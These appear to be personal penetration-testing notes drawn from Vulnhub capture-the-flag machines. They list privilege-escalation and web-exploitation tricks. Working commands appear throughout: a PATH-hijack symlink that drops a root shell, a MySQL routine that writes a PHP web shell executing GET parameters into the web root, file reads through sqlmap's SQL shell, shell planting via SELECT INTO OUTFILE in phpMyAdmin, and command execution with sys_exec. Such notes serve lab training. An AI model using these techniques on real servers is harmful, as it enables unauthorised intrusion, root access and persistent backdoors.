Trick an Upload function by uploading an image, interecepting the HTTP request and changing the data to a script

/bin/bash has some anti-buffer overflows, but /bin/sh does not. (Covfefe)


(Some good ones from NullByte CTF on Vulnhub)
if a c script calls a system function without an explicit path - you can trick it into executing your commands by changing the $PATH and adding a symlink to that function
	echo $PATH > /dev/shm/oldpath
	export PATH=/dir_of_program/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
	ln -s /bin/sh ps
	./program_runs_ps
This drops a root shell

Check strange strings found in stego as URLs - use exiftool and strings.

sqlmap works in URLS that aren't just id= --- in this case, we use usertosearch=

You can fuzz with ZAP to brute force passwords

MySQL Backdoor
	CREATE TABLE backdoor(
	Stack TEXT
	) ENGINE=MYSIaM;

	INSERT INTO backdoor
	VALUES(
	'<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>'
	);

	SELECT *
	INTO DUMPFILE '/var/www/html/uploads/shell.php'
	FROM backdoor;


	Then via browser
	http://192.168.0.101/uploads/shell?cmd=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	Then you can upload a web shell


sqlmap has a --sql-shell capabilty!
it can run:
	select load_file('/var/www/html/pathtowebpages')
or any other path!

You can drop a shell into a phpmyadmin page if you have write access
go to the server (often localhost)
find the spot where you can enter sql commands
	select 'ANY TEXT' into outfile '/var/www/html/... some file'
then that can be visited in the browser


(Kioptrix4)
sometimes mysql doesn't require a password
mysql can execute commands with
	select sys_exec('COMMAND');
these commands can't output to standard output, but will happen. (chown, chmod, touch, go nuts!)
